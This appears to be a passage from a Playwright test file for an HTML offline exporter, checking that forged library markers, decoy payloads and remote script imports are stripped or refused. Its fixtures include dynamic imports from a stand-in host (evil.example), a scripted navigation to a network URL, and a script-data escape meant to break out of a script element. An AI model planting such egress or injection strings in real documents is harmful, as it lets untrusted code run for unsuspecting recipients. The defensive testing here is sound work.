    '<script type="text/livescript">',
    "/* cmh-legacy-chart-loader pulls chart.umd.js */",
    "</script>",
  ],
  INERT_SCRIPT_TYPES.map((t) => scriptBlock(t, "cmh-inert-" + typeSlug(t), "inert-" + typeSlug(t) + ".js"))
).join("\n");
test("CMH-OFFLINE-04: the offline strips cover every executable script MIME type, not only the modern three", async ({ page }) => {
  test.setTimeout(90000);
  const staged = stageContent(LEGACY_TYPE_CONTENT, { key: "cmh-offline-legacy-types", source: "offline-legacy-types.html" });
  try {
    await page.route(/^https?:\/\//, (route) => route.abort());
    await installDownloadTextCapture(page);
    await page.goto(fileUrl(staged.html));
    await ready(page);

    await openToolbarMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    const exportedHtml = await capturedDownloadText(page);

    // A legacy JavaScript MIME type executes exactly like `text/javascript`, so the network strip
    // must reach EVERY one of them and remove its remote dynamic import.
    for (const type of RUNNABLE_SCRIPT_TYPES) {
      expect(exportedHtml, `runnable type ${type} must be stripped`).not.toContain(`cmh-runnable-${typeSlug(type)}`);
      expect(exportedHtml, `runnable type ${type} egress target`).not.toContain(`egress-${typeSlug(type)}.js`);
    }
    // The renderer strip must reach them too: a stale mermaid or chart loader shim carrying a
    // legacy type is just as dead as one carrying a modern type.
    expect(exportedHtml, "application/x-javascript mermaid loader").not.toContain("cmh-legacy-mermaid-loader");
    expect(exportedHtml, "text/livescript chart loader").not.toContain("cmh-legacy-chart-loader");

    // ...and no further: a genuinely non-executable script block carrying the same import text is
    // data, not code, so widening the predicate must not start deleting it.
    for (const type of INERT_SCRIPT_TYPES) {
      expect(exportedHtml, `inert type ${type} is data, not code`).toContain(`cmh-inert-${typeSlug(type)}`);
      expect(exportedHtml, `inert type ${type} keeps its text`).toContain(`inert-${typeSlug(type)}.js`);
    }
    expect(networkLoadRefs(exportedHtml)).toEqual([]);
  } finally {
    fs.rmSync(staged.dir, { recursive: true, force: true });
  }
});

const FORGERY_CONTENT = `
<h1>Forged inlined-library marker</h1>
<p id="forge-note">This document needs mermaid, so the export must resolve a library for it.</p>
<pre class="mermaid cm-skip">
flowchart LR
  A[Alpha] --> B[Beta]
</pre>`;

const FORGED_NOTICE = "<!-- Third-party notice - mermaid is bundled inline for offline use under the MIT License:\nFORGED LICENSE TEXT\n-->";

// Cut the vendored payload out by INDEX (not a replace() pattern): this is a fixture removing one
// known element, not a sanitizer, and a regex here reads to CodeQL as incomplete sanitization.
function withoutVendoredPayload(html) {
  const idAt = html.indexOf('id="cmhVendoredRichLibs"');
  if (idAt < 0) throw new Error("fixture has no vendored payload to remove");
  const openAt = html.lastIndexOf("<script", idAt);
  const closeAt = html.indexOf("</script>", idAt);
  if (openAt < 0 || closeAt < openAt) throw new Error("could not bound the vendored payload");
  return html.slice(0, openAt) + html.slice(closeAt + "</script>".length);
}

test("CMH-OFFLINE-07: a forged inlined-library marker is never re-emitted as executable code", async ({ page }) => {
  test.setTimeout(180000);
  // Re-emitting a captured library GRANTS IT EXECUTION in the exported file, and the document being
  // exported is untrusted, so the `data-cmh-offline-lib` marker alone must never be taken as proof
  // this exporter wrote it. Each forgery below defeats exactly ONE provenance gate, so the export
  // falls through to the same loud failure a payload-less rich document has always produced
  // (CMH-SIZE-01) instead of promoting the forged bytes into a running script. Every case keeps the
  // OTHER gates satisfied, so each one is discriminating on its own gate. The trailing LICENSING
  // case is not a gate: its copy passes all four, so it fails with its own specific message
  // (`toast`) naming the missing notice and the action, not the generic missing-bundle one.
  const forgeries = [
    {
      name: "gate 1: a marker outside the head is not captured",
      // The notice sits immediately before the script, in the body, so ONLY the location gate
      // rejects this one.
      head: "",
      body: FORGED_NOTICE + '\n<script data-cmh-offline-lib="mermaid">/* cmh-forged-body */ window.__forged = 1;</script>',
    },
    {
      name: "gate 2: inert type is not promoted to code",
      head: FORGED_NOTICE + '\n<script data-cmh-offline-lib="mermaid" type="application/json">"cmh-forged-inert"</script>',
      body: "",
    },
    {
      name: "gate 2: a MIME-parameter type does not execute, so it is not promoted",
      // HTML matches a script type by ESSENCE, so `text/javascript;charset=utf-8` never runs.
      head: FORGED_NOTICE + '\n<script data-cmh-offline-lib="mermaid" type="text/javascript;charset=utf-8">/* cmh-forged-param */ window.__forged = 2;</script>',
      body: "",
    },
    {
      name: "gate 2: a nomodule body never ran in any module-supporting browser",
      head: FORGED_NOTICE + '\n<script data-cmh-offline-lib="mermaid" nomodule>/* cmh-forged-nomodule */ window.__forged = 3;</script>',
      body: "",
    },
    {
      name: "gate 2: the inline text of a src-bearing marker never ran",
      head: FORGED_NOTICE + '\n<script data-cmh-offline-lib="mermaid" src="mermaid.min.js">/* cmh-forged-src */ window.__forged = 4;</script>',
      body: "",
    },
    {
      name: "gate 3: captured code cannot smuggle egress past the strips",
      head: FORGED_NOTICE + '\n<script data-cmh-offline-lib="mermaid">/* cmh-forged-egress */ import("https://evil.example/forged-egress.js").catch(function () {});</script>',
      body: "",
    },
    {
      name: "gate 4: bytes that open a script-data escape are not re-emitted",
      // `<!--` then `<script` puts a re-parse into the script-data-double-escaped state, where the
      // emitted `</script>` no longer closes the element and the rest of the head is swallowed.
      head: FORGED_NOTICE + '\n<script data-cmh-offline-lib="mermaid">/* cmh-forged-escape */ var s = "<!--<script>x<\\/script>";</script>',
      body: "",
    },
    {
      name: "licensing: a library with no MIT notice beside it is not redistributed",
      head: '<script data-cmh-offline-lib="mermaid">/* cmh-forged-unlicensed */ window.__forged = 5;</script>',
      body: "",
      // The bundle is right there in the file, so the generic missing-bundle message would be
      // misleading: only the licence blocks the re-emission, and the fix is a different action.
      toast: /inlined mermaid library[\s\S]*no MIT license notice[\s\S]*source document that still carries the vendored payload/i,
      // The long actionable message must outlive the 3s confirmation-toast default, or the sentence
      // that says what to do is gone before it can be read.
      stillShownAfterMs: 5000,
    },
    {
      name: "licensing: a copy rejected by a gate is not reported as merely unlicensed",
      // Two marked copies: the first carries a valid notice but fails gate 3, the second passes
      // every gate but has no notice. Licensing was NOT the sole blocker, so naming it would send
      // the user after a licence when a copy was actually refused as unsafe.
      head: FORGED_NOTICE
        + '\n<script data-cmh-offline-lib="mermaid">/* cmh-rejected-egress */ import("https://evil.example/x.js").catch(function () {});</script>'
        + '\n<script data-cmh-offline-lib="mermaid">/* cmh-then-unlicensed */ window.__forged = 6;</script>',
      body: "",
    },
    {
      name: "licensing: an unlicensed copy of another library does not mask this one's failure",
      // The flags are per library, so a notice-less Chart.js marker must not make the mermaid this
      // document actually needs report a licensing cause it does not have.
      head: '<script data-cmh-offline-lib="chartjs">/* cmh-forged-other-lib */ window.__forged = 7;</script>',
      body: "",
      toast: /missing the vendored mermaid bundle/i,
    },
    {
      name: "licensing: a marker outside the head is not a candidate, so it does not mask the licence",
      // Gate 1 is the LOCATION filter that decides what a candidate IS - the exporter only ever
      // appends to <head> - so a body-placed marker is authored content, not a copy this exporter
      // refused. It must NOT downgrade the message: the head copy is the only candidate, and
      // licensing genuinely is the only thing blocking it.
      body: FORGED_NOTICE + '\n<script data-cmh-offline-lib="mermaid">/* cmh-body-marker */ window.__forged = 10;</script>',
      head: '<script data-cmh-offline-lib="mermaid">/* cmh-head-unlicensed */ window.__forged = 11;</script>',
      toast: /inlined mermaid library[\s\S]*no MIT license notice[\s\S]*source document that still carries the vendored payload/i,
    },
    {
      name: "licensing: the error names the library it could not re-emit, not the other one",
      // This document needs BOTH libraries and neither inlined copy is licensed. Chart.js is
      // resolved first, so its name - not mermaid's - must be the one in the message.
      content: FORGERY_CONTENT + '\n<figure class="chart"><canvas id="forge-chart"></canvas></figure>',
      head: '<script data-cmh-offline-lib="chartjs">/* cmh-forged-both-a */ window.__forged = 8;</script>'
        + '\n<script data-cmh-offline-lib="mermaid">/* cmh-forged-both-b */ window.__forged = 9;</script>',
      body: "",
      toast: /inlined Chart\.js library[\s\S]*no MIT license notice[\s\S]*source document that still carries the vendored payload/i,
    },
  ];

  // Registered ONCE: a per-iteration route would stack a handler per case on the shared page.
  await page.route(/^https?:\/\//, (route) => route.abort());
  for (const forgery of forgeries) {
    const staged = stageContent((forgery.content || FORGERY_CONTENT) + forgery.body, { key: "cmh-offline-forge", source: "offline-forge.html" });
    const downloads = [];
    const onDownload = (d) => downloads.push(d);
    try {
      const html = withoutVendoredPayload(fs.readFileSync(staged.html, "utf8"))
        .replace("</head>", forgery.head + "\n</head>");
      fs.writeFileSync(staged.html, html);

      await page.goto(fileUrl(staged.html));
      await ready(page);
      // Listen for THIS case only, so a late download can never be attributed to another case.
      page.on("download", onDownload);
      await openToolbarMenu(page);
      await page.locator("#btnExportOfflineTop").click();

      const toast = page.locator("#toast");
      await expect(toast, forgery.name).toContainText(forgery.toast || /missing the vendored/i, { timeout: 15000 });
      // An export failure must still be ON SCREEN when it is read, and be announced assertively.
      // `toContainText` matches the element's text even after the toast has faded, and the toast is
      // hidden by OPACITY (so Playwright's `toBeVisible` is a tautology here) - the `show` class is
      // the only thing that discriminates a live toast from a faded one.
      await expect(toast, forgery.name).toHaveClass(/\bshow\b/);
      await expect(toast, forgery.name).toHaveAttribute("role", "alert");
      if (forgery.stillShownAfterMs) {
        await page.waitForTimeout(forgery.stillShownAfterMs);
        await expect(toast, forgery.name).toHaveClass(/\bshow\b/);
      }
      expect(downloads, forgery.name).toHaveLength(0);
    } finally {
      page.off("download", onDownload);
      fs.rmSync(staged.dir, { recursive: true, force: true });
    }
  }
});

test("CMH-OFFLINE-07: the last qualifying inlined library wins over one planted before it", async ({ page }) => {
  test.setTimeout(90000);
  // This exporter appends the library as the head's LAST child, so a qualifying copy planted
  // earlier must never displace the genuine one - that would "succeed" with a diagram that never
  // renders. The two notice-carrying copies below satisfy every provenance gate, so only the
  // ordering rule separates them; the leading notice-less copy also pins that an unlicensed capture
  // does not poison the winning one (it must neither be emitted nor displace the genuine copy).
  const staged = stageContent(FORGERY_CONTENT, { key: "cmh-offline-lastwins", source: "offline-lastwins.html" });
  try {
    const unlicensed = '<script data-cmh-offline-lib="mermaid">/* cmh-planted-unlicensed */ window.__unlicensed = 1;</script>';
    const decoy = FORGED_NOTICE + '\n<script data-cmh-offline-lib="mermaid">/* cmh-planted-early */ window.__early = 1;</script>';
    const genuine = "<!-- Third-party notice - mermaid is bundled inline for offline use under the MIT License:\nGENUINE LICENSE TEXT\n-->"
      + '\n<script data-cmh-offline-lib="mermaid">/* cmh-genuine-late */ window.__late = 1;</script>';
    const html = withoutVendoredPayload(fs.readFileSync(staged.html, "utf8"))
      .replace("</head>", unlicensed + "\n" + decoy + "\n" + genuine + "\n</head>");
    fs.writeFileSync(staged.html, html);

    await page.route(/^https?:\/\//, (route) => route.abort());
    await installDownloadTextCapture(page);
    await page.goto(fileUrl(staged.html));
    await ready(page);
    await openToolbarMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    const exportedHtml = await capturedDownloadText(page);

    expect(exportedHtml, "the last qualifying copy travels").toContain("cmh-genuine-late");
    expect(exportedHtml, "the earlier planted copy does not").not.toContain("cmh-planted-early");
    expect(exportedHtml, "the notice-less copy does not").not.toContain("cmh-planted-unlicensed");
    expect(exportedHtml).toContain("GENUINE LICENSE TEXT");
    expect(exportedHtml).not.toContain("FORGED LICENSE TEXT");
    // Still exactly one of each, so ordering did not turn into duplication.
    expect((exportedHtml.match(/data-cmh-offline-lib="mermaid"/g) || []).length).toBe(1);
    expect((exportedHtml.match(/Third-party notice - mermaid/g) || []).length).toBe(1);
  } finally {
    fs.rmSync(staged.dir, { recursive: true, force: true });
  }
});
test("CMH-OFFLINE-07: the vendored payload wins over a copy already in the document", async ({ page }) => {
  test.setTimeout(90000);
  // The captured copy is a FALLBACK for a document whose payload is gone, never a substitute for a
  // fresh one. With a payload present the export must inline the vendored bytes and the planted
  // copy must not survive anywhere in the output.
  const staged = stageContent(FORGERY_CONTENT, { key: "cmh-offline-precedence", source: "offline-precedence.html" });
  try {
    const html = fs.readFileSync(staged.html, "utf8").replace(
      "</head>",
      FORGED_NOTICE + '\n<script data-cmh-offline-lib="mermaid">/* cmh-planted-copy */ window.__planted = true;</script>\n</head>');
    fs.writeFileSync(staged.html, html);

    await page.route(/^https?:\/\//, (route) => route.abort());
    await installDownloadTextCapture(page);
    await page.goto(fileUrl(staged.html));
    await ready(page);
    await openToolbarMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    const exportedHtml = await capturedDownloadText(page);

    expect(exportedHtml, "the planted copy must not survive").not.toContain("cmh-planted-copy");
    expect(exportedHtml).not.toContain("FORGED LICENSE TEXT");
    // The real vendored library and its real notice travelled instead, exactly once each.
    expect((exportedHtml.match(/data-cmh-offline-lib="mermaid"/g) || []).length).toBe(1);
    expect((exportedHtml.match(/Third-party notice - mermaid/g) || []).length).toBe(1);
    expect(exportedHtml).toContain("Copyright (c) 2014 - 2022 Knut Sveidqvist");
    expect(networkLoadRefs(exportedHtml)).toEqual([]);
  } finally {
    fs.rmSync(staged.dir, { recursive: true, force: true });
  }
});

// The vendored payload is INFRASTRUCTURE, not content: `tools/authoring/vendored_libs.py` places it
// immediately before `</body>`, i.e. AFTER the content root, while the SHAREABLE template still
// carries it in the head. Mirror the finalized placement so an authored decoy inside the content
// region comes FIRST in document order - which is exactly what a document-order lookup would take.
// Cut and re-insert by INDEX (not a replace() pattern): this is a fixture moving one known element,
// not a sanitizer, and a regex here reads to CodeQL as incomplete sanitization.
function withPayloadAfterContent(html) {
  const idAt = html.indexOf('id="cmhVendoredRichLibs"');
  if (idAt < 0) throw new Error("fixture has no vendored payload to move");
  const openAt = html.lastIndexOf("<script", idAt);
  const closeAt = html.indexOf("</script>", idAt);
  if (openAt < 0 || closeAt < openAt) throw new Error("could not bound the vendored payload");
  const block = html.slice(openAt, closeAt + "</script>".length);
  const rest = html.slice(0, openAt) + html.slice(closeAt + "</script>".length);
  const bodyEnd = rest.lastIndexOf("</body>");
  if (bodyEnd < 0) throw new Error("fixture has no closing body tag");
  return rest.slice(0, bodyEnd) + block + "\n" + rest.slice(bodyEnd);
}

// Rewrite ONE field of the real payload, leaving the library bytes intact - the shape a minifier or
// a deliberate edit leaves behind. Parsed and re-serialized rather than pattern-edited so the
// surrounding megabyte of base64 is untouched.
function withPayloadField(html, key, value) {
  const idAt = html.indexOf('id="cmhVendoredRichLibs"');
  if (idAt < 0) throw new Error("fixture has no vendored payload to edit");
  const openEnd = html.indexOf(">", idAt) + 1;
  const closeAt = html.indexOf("</script>", openEnd);
  if (openEnd <= 0 || closeAt < openEnd) throw new Error("could not bound the vendored payload");
  const payload = JSON.parse(html.slice(openEnd, closeAt));
  if (!(key in payload)) throw new Error("fixture payload has no " + key);
  payload[key] = value;
  return html.slice(0, openEnd) + JSON.stringify(payload) + html.slice(closeAt);
}

// A duplicate content-root id planted in the authored content region. It is legal HTML and
// `getElementById` silently takes the first match, so with a first-match lookup the boundary is
// whichever root happens to come first and the "outside the content root" test stops meaning
// anything. There is no second payload here: the ONLY thing that can refuse this document is the
// requirement that exactly one element carries the content-root id.
const DUPLICATE_ROOT_CONTENT = FORGERY_CONTENT + '\n<div id="commentRoot" hidden></div>';

const DECOY_LIB_CODE = "/* cmh-decoy-lib */ window.__decoyLib = 1;";
const DECOY_LICENSE = "DECOY PAYLOAD LICENSE TEXT";
const MERMAID_COPYRIGHT = "Copyright (c) 2014 - 2022 Knut Sveidqvist";

function payloadBlock(license) {
  return '<script type="application/json" id="cmhVendoredRichLibs">'
    + JSON.stringify({
      encoding: "gzip+base64",
      mermaidGzipBase64: zlib.gzipSync(Buffer.from(DECOY_LIB_CODE)).toString("base64"),
      chartjsGzipBase64: zlib.gzipSync(Buffer.from(DECOY_LIB_CODE)).toString("base64"),
      mermaidLicense: license,
      chartjsLicense: license,
    })
    + "</script>";
}

// A captured library copy that satisfies every provenance gate of CMH-OFFLINE-07, so only the
// notice rule separates the licensed form from the noticeless one.
function capturedMermaidCopy(marker, withNotice) {
  const script = '<script data-cmh-offline-lib="mermaid">/* ' + marker + " */ window." + marker.replace(/-/g, "_") + " = 1;</script>";
  return withNotice ? FORGED_NOTICE + "\n" + script : script;
}

// A document whose content needs mermaid AND carries an authored decoy payload block ahead of the
// real one. `extraContent` adds further authored markup inside the content region.
function stageDecoyPayloadDoc(key, extraContent) {
  const content = FORGERY_CONTENT + "\n" + payloadBlock(DECOY_LICENSE) + "\n" + (extraContent || "");
  const staged = stageContent(content, { key: key, source: key + ".html" });
  const html = withPayloadAfterContent(fs.readFileSync(staged.html, "utf8"));
  // The real payload must end up AFTER the content, with the decoy inside it: the fixture only
  // reproduces the hazard (a document-order lookup taking the decoy) if both hold.
  expect(html.indexOf(DECOY_LICENSE), "decoy precedes the real payload").toBeLessThan(
    html.lastIndexOf('id="cmhVendoredRichLibs"'));
  expect(html.lastIndexOf('id="cmhVendoredRichLibs"'), "the real payload follows the content")
    .toBeGreaterThan(html.indexOf(CONTENT_END));
  fs.writeFileSync(staged.html, html);
  return staged;
}

async function expectExportRefused(page, staged, pattern, label) {
  const downloads = [];
  const onDownload = (d) => downloads.push(d);
  try {
    await page.goto(fileUrl(staged.html));
    await ready(page);
    page.on("download", onDownload);
    await openToolbarMenu(page);
    await page.locator("#btnExportOfflineTop").click();
    // The toast text IS the assertion that the export failed; it auto-hides after 3s, so do not
    // chain a separate visibility check that could race that timer. SOFT assertions so a table of
    // cases reports every failure instead of hiding the later ones behind the first.
    await expect.soft(page.locator("#toast"), label).toContainText(pattern, { timeout: 15000 });
    expect.soft(downloads, label).toHaveLength(0);
  } finally {
    page.off("download", onDownload);
  }
}

test("CMH-OFFLINE-08: an authored decoy vendored payload never displaces the real one", async ({ page }) => {
  test.setTimeout(90000);
  // The payload is resolved as INFRASTRUCTURE - a payload-id script OUTSIDE the content root - not as
  // "the first match in document order". A document-order lookup takes an AUTHORED decoy planted
  // inside the content region, inflates its compressed bytes, and inlines them into an export whose
  // own CSP is `script-src 'unsafe-inline'`, so document-supplied code runs in a file the recipient
  // believes is a clean skill-generated export.
  const staged = stageDecoyPayloadDoc("cmh-offline-decoy");
  try {
    await page.route(/^https?:\/\//, (route) => route.abort());
    await installDownloadTextCapture(page);
    await page.goto(fileUrl(staged.html));
    await ready(page);
    await openToolbarMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    const exportedHtml = await capturedDownloadText(page);

    // The decoy's bytes are gzipped inside its JSON, so this literal can only appear if they were
    // inflated and inlined as code.
    expect(exportedHtml, "the decoy payload's bytes must never be inlined").not.toContain("cmh-decoy-lib");
    expect((exportedHtml.match(/data-cmh-offline-lib="mermaid"/g) || []).length).toBe(1);
    expect((exportedHtml.match(/Third-party notice - mermaid/g) || []).length).toBe(1);
    const notice = [...exportedHtml.matchAll(/<!--([\s\S]*?)-->/g)]
      .map((m) => m[1]).find((c) => c.includes("Third-party notice - mermaid"));
    expect(notice, "the emitted notice is the real one, not the decoy's").toContain(MERMAID_COPYRIGHT);
    expect(notice).not.toContain(DECOY_LICENSE);
    expect(networkLoadRefs(exportedHtml)).toEqual([]);
  } finally {
    fs.rmSync(staged.dir, { recursive: true, force: true });
  }
});

test("CMH-OFFLINE-08: payload resolution fails closed when it cannot be identified", async ({ page }) => {
  test.setTimeout(180000);
  // Ambiguity is NOT absence. Absence is the ordinary re-export case, which legitimately falls back
  // to the library copies already inlined in the file - so reporting a second, unidentifiable
  // candidate as "no payload" would quietly hand the export to document-supplied bytes, the very
  // substitution this rule exists to prevent. Each case below is otherwise exportable.
  const cases = [
    {
      name: "two infrastructure payload blocks",
      build: (html) => withPayloadAfterContent(html).replace("</head>", payloadBlock(DECOY_LICENSE) + "\n</head>"),
    },
    {
      name: "two payload blocks while the document also carries a captured copy",
      // Without a distinct ambiguous state this one SUCCEEDS on document-supplied bytes: the
      // resolver reports "absent" and lib() falls through to the captured copy.
      build: (html) => withPayloadAfterContent(html)
        .replace("</head>", payloadBlock(DECOY_LICENSE) + "\n" + capturedMermaidCopy("cmh-captured-fallback", true) + "\n</head>"),
    },
    {
      name: "a planted duplicate content root leaves no verifiable boundary",
      // Discriminating on the BOUNDARY rule alone: there is exactly one payload block, so nothing
      // but "exactly one element carries the content-root id" can refuse this document. With a
      // first-match lookup the export just proceeds against whichever root came first. The refusal
      // now comes from the shared boundary (CMH-EXP-17), which every reserved-block lookup
      // consults, so it fires before this pipeline reaches the payload - earlier, same rule.
      content: DUPLICATE_ROOT_CONTENT,
      build: (html) => withPayloadAfterContent(html),
      refusal: /content-root id/i,
    },
    {
      name: "a document with no content root leaves no verifiable boundary",
      // The other half of "missing or duplicated": with NO content root the shared boundary has
      // nothing to be outside OF and stands aside, so this document reaches THIS resolver - which
      // must still refuse rather than fall back to the library copies already in the file.
      build: (html) => withPayloadAfterContent(html).replace('id="commentRoot"', 'id="commentRootRenamed"'),
    },
  ];

  await page.route(/^https?:\/\//, (route) => route.abort());
  for (const c of cases) {
    const staged = stageContent(c.content || FORGERY_CONTENT, { key: "cmh-offline-ambiguous", source: "offline-ambiguous.html" });
    try {
      fs.writeFileSync(staged.html, c.build(fs.readFileSync(staged.html, "utf8")));
      await expectExportRefused(page, staged, c.refusal || /cannot identify the vendored/i, c.name);
    } finally {
      fs.rmSync(staged.dir, { recursive: true, force: true });
    }
  }
});

test("CMH-OFFLINE-08: no infrastructure payload block survives an export, authored content does", async ({ page }) => {
  test.setTimeout(90000);
  // An Offline export CONSUMES the payload and removes it - every infrastructure copy, including one
  // parked in a `<template>` (which `querySelectorAll` does not descend into, yet serialization
  // preserves and a script adopted out of a template runs). What it must NOT remove is a payload-id
  // script inside the content root: an authored document may show one as an EXAMPLE, the authoring
  // tool refuses to cut it for that reason, and deleting it would drop content and shift every
  // comment anchor measured after it. Preserving it is not a free pass either - such a script is
  // authored content, so it faces the same network-import strip as any other authored script.
  const authoredTemplate = "<template>" + payloadBlock("CONTENT TEMPLATE LICENSE") + "</template>";
  const authoredLoader = '<script id="cmhVendoredRichLibs">/* cmh-authored-loader */ import("https://evil.example/x.js");</script>';
  const staged = stageDecoyPayloadDoc("cmh-offline-payloadstrip", authoredTemplate + "\n" + authoredLoader);  try {
    const html = fs.readFileSync(staged.html, "utf8")
      .replace("</head>", "<template>" + payloadBlock("TEMPLATE PARKED LICENSE") + "</template>\n</head>");
    fs.writeFileSync(staged.html, html);

    await page.route(/^https?:\/\//, (route) => route.abort());
    await installDownloadTextCapture(page);
    await page.goto(fileUrl(staged.html));
    await ready(page);
    await openToolbarMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    const exportedHtml = await capturedDownloadText(page);

    // The authored blocks inside the content region survive - the plain one and the one inside an
    // authored template - and nothing else does.
    const begin = exportedHtml.indexOf(CONTENT_BEGIN);
    const end = exportedHtml.indexOf(CONTENT_END);
    expect(begin).toBeGreaterThan(-1);
    expect(end).toBeGreaterThan(begin);
    const remaining = [...exportedHtml.matchAll(/id="cmhVendoredRichLibs"/g)].map((m) => m.index);
    expect(remaining, "only the authored copies remain").toHaveLength(2);
    remaining.forEach(function (at) {
      expect(at, "a surviving block is authored content").toBeGreaterThan(begin);
      expect(at).toBeLessThan(end);
    });
    expect(exportedHtml).toContain(DECOY_LICENSE);
    expect(exportedHtml, "a template inside the content is authored content too").toContain("CONTENT TEMPLATE LICENSE");
    // The template-parked infrastructure copy is gone, and so is the real payload: its license text
    // now appears exactly once, as the emitted notice.
    expect(exportedHtml, "a template-parked payload must not ride along").not.toContain("TEMPLATE PARKED LICENSE");
    expect((exportedHtml.match(/Copyright \(c\) 2014 - 2022 Knut Sveidqvist/g) || []).length).toBe(1);
    // Preserved as content, but not exempt from the strips every authored script faces.
    expect(exportedHtml, "an authored script that borrows the payload id gets no free pass")
      .not.toContain("evil.example");
    expect(networkLoadRefs(exportedHtml)).toEqual([]);
  } finally {
    fs.rmSync(staged.dir, { recursive: true, force: true });
  }
});

test("CMH-OFFLINE-08: a vendored library whose MIT notice is missing is refused, not shipped", async ({ page }) => {
  test.setTimeout(180000);
  // MIT requires the notice to accompany a redistributed copy, and an Offline export IS a
  // redistribution. The library bytes and their notice therefore travel as ONE unit, from whichever
  // source is chosen - and there is deliberately no cross-source fallback on the notice alone, or
  // anyone who can strip a notice could force the document's own copy to be used instead.
  const cases = [
    {
      name: "the payload's notice text was stripped",
      build: (html) => withPayloadField(html, "mermaidLicense", ""),
      expected: /missing the MIT notice for the vendored mermaid/i,
    },
    {
      name: "the payload's notice is not a string",
      // `String({})` is "[object Object]" - not blank, so a coercing check would emit it AS the notice.
      build: (html) => withPayloadField(html, "mermaidLicense", {}),
      expected: /missing the MIT notice for the vendored mermaid/i,
    },
    {
      name: "a captured copy's notice cannot rescue a noticeless payload",
      build: (html) => withPayloadField(html, "mermaidLicense", "")
        .replace("</head>", capturedMermaidCopy("cmh-captured-rescue", true) + "\n</head>"),
      expected: /missing the MIT notice for the vendored mermaid/i,
    },
    {
      name: "the Chart.js notice is required on its own path",
      content: CONTENT,
      build: (html) => withPayloadField(html, "chartjsLicense", ""),
      expected: /missing the MIT notice for the vendored Chart\.js/i,
    },
  ];

  await page.route(/^https?:\/\//, (route) => route.abort());
  for (const c of cases) {
    const staged = stageContent(c.content || FORGERY_CONTENT, { key: "cmh-offline-nonotice", source: "offline-nonotice.html" });
    try {
      fs.writeFileSync(staged.html, c.build(fs.readFileSync(staged.html, "utf8")));
      // The failure names the missing NOTICE - the actual gap - not a bundle the document carries.
      await expectExportRefused(page, staged, c.expected, c.name);
    } finally {
      fs.rmSync(staged.dir, { recursive: true, force: true });
    }
  }
});

test("CMH-OFFLINE-08: payload bytes carrying egress or a script-data escape are refused, not inlined", async ({ page }) => {
  test.setTimeout(180000);
  // The inflated payload bytes are appended as an EXECUTABLE script AFTER both offline strips have
  // already run, so nothing downstream ever looks at them. Position and uniqueness authenticate the
  // payload against an author of the CONTENT REGION only; against an author of the WHOLE FILE the
  // old argument was "they can already run script in the document anyway" - true of the SOURCE
  // document, but the export exists to strip egress OUT of the file it produces. A remote dynamic
  // import or a scripted navigation to a network URL in an ordinary authored script IS deleted by
  // `_stripOfflineNetworkLoads`; routing the same code through the payload used to get it into the
  // exported file with the strips bypassed, which is a capability the authored-script path does not
  // have. So the payload bytes clear the same two content gates the captured-copy path applies, and
  // a refusal is loud, specific, and produces NO download.
  // Pin the whole message CONTRACT, not just its prefix: CMH-OFFLINE-08 promises the refusal names
  // the library, says what the gate matched, and gives the remedy, so a regex matching only
  // "refused the vendored X bundle" would stay green if the actionable half were deleted.
  const refusal = (name) => new RegExp(
    "refused the vendored " + name + " bundle: its bytes match the network-egress pattern[\\s\\S]*"
    + "script-data escape[\\s\\S]*Re-run the authoring finalize step to refresh the vendored payload", "i");
  const cases = [
    {
      name: "a remote dynamic import",
      code: 'import("https://example.com/payload-egress.js");',
    },
    {
      name: "a scripted navigation to a network URL",
      code: 'window.location.href = "https://example.com/payload-nav";',
    },
    {
      name: "a script-data escape",
      // The load-bearing shape: `_escClose` only neutralizes an end tag whose `>` follows the name
      // IMMEDIATELY, but the tokenizer ends the element on whitespace or `/` after the name too, so
      // these bytes close the library element early and inject the rest of the payload into the head
      // as MARKUP. Built from parts so this file does not carry the sequence itself.
      code: "/* <" + "/script > */ window.__payloadEscape = 1;",
    },
    {
      // The inert half of the same deliberately-superset pattern: a start tag alone does not escape
      // the state, and the gate refuses it anyway rather than reasoning about tokenizer states.
      name: "a script start tag in the payload bytes",
      code: "/* <" + "script> */ window.__payloadStartTag = 1;",
    },
    {
      // The gate lives in the one `lib()` chokepoint both libraries go through, so drive the OTHER
      // branch too rather than trusting that shared call site by inspection.
      name: "the Chart.js branch is gated too",
      content: CONTENT,
      field: "chartjsGzipBase64",
      code: 'import("https://example.com/payload-chart-egress.js");',
      expected: refusal("Chart\\.js"),
    },
  ];

  await page.route(/^https?:\/\//, (route) => route.abort());
  for (const c of cases) {
    const staged = stageContent(c.content || FORGERY_CONTENT, { key: "cmh-offline-payload-egress", source: "offline-payload-egress.html" });
    try {
      const bytes = zlib.gzipSync(Buffer.from("/* cmh-payload-unsafe */ " + c.code)).toString("base64");
      fs.writeFileSync(staged.html, withPayloadField(fs.readFileSync(staged.html, "utf8"), c.field || "mermaidGzipBase64", bytes));
      // Not the generic missing-bundle message: the bundle IS in the document, and the action that
      // fixes it is refreshing the payload, so the refusal has to say so.
      await expectExportRefused(page, staged, c.expected || refusal("mermaid"), c.name);
    } finally {
      fs.rmSync(staged.dir, { recursive: true, force: true });
    }
  }
});

test("CMH-OFFLINE-08: a noticeless captured copy never displaces a licensed one", async ({ page }) => {
  test.setTimeout(90000);
  // Capture is last-match-wins, so recording a noticeless copy unconditionally would let a planted
  // marker with no notice overwrite the genuine pair and turn a legitimate re-export into a
  // permanent refusal. The licensed copy wins and the export still succeeds.
  const staged = stageContent(FORGERY_CONTENT, { key: "cmh-offline-noticeless", source: "offline-noticeless.html" });
  try {
    const html = withoutVendoredPayload(fs.readFileSync(staged.html, "utf8"))
      .replace("</head>", capturedMermaidCopy("cmh-licensed-copy", true) + "\n"
        + capturedMermaidCopy("cmh-noticeless-copy", false) + "\n</head>");
    fs.writeFileSync(staged.html, html);

    await page.route(/^https?:\/\//, (route) => route.abort());
    await installDownloadTextCapture(page);
    await page.goto(fileUrl(staged.html));
    await ready(page);
    await openToolbarMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    const exportedHtml = await capturedDownloadText(page);

    expect(exportedHtml, "the licensed copy travels").toContain("cmh-licensed-copy");
